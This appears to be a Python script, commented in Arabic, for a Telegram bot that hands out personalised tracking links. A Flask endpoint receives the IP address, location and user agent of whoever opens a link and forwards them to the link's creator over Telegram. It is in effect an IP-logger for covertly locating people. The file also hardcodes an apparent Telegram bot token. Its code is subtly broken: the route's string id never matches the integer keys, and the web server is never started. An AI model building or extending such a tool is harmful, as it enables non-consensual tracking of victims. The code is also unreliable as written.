import telebot
from flask import Flask, request, jsonify
import random

TOKEN = '7464643208:AAGWFyuvZPmVGq8TgHPVgWX12qeje26z4i4'
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

user_links = {}

# إرسال رسالة تحتوي على زر لإنشاء رابط جديد
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = telebot.types.InlineKeyboardMarkup()
    button = telebot.types.InlineKeyboardButton('اضغط هنا لإنشاء الرابط', callback_data='create_link')
    markup.add(button)
    bot.send_message(message.chat.id, "مرحبًا! اضغط على الزر أدناه لإنشاء رابط مخصص.", reply_markup=markup)

# عند ضغط المستخدم على الزر
@bot.callback_query_handler(func=lambda call: call.data == 'create_link')
def create_link(call):
    user_id = call.from_user.id
    unique_id = random.randint(1000, 9999)
    user_link = f"http://your-website.com/{unique_id}"
    user_links[unique_id] = user_id
    bot.send_message(call.message.chat.id, f"هذا هو رابطك الخاص: {user_link}")

# إعداد مسار استقبال البيانات المجمعة
@app.route('/collect_info/<unique_id>', methods=['POST'])
def collect_info(unique_id):
    if unique_id in user_links:
        user_id = user_links[unique_id]
        data = request.json  # البيانات المجمعة من صفحة الويب
        message = f"تم جمع المعلومات:\nIP: {data['ip']}\nLocation: {data['location']}\nUser-Agent: {data['user_agent']}"
        bot.send_message(user_id, message)
        return jsonify({"status": "success"}), 200
    return jsonify({"error": "Invalid link"}), 404

if __name__ == '__main__':
    bot.polling()
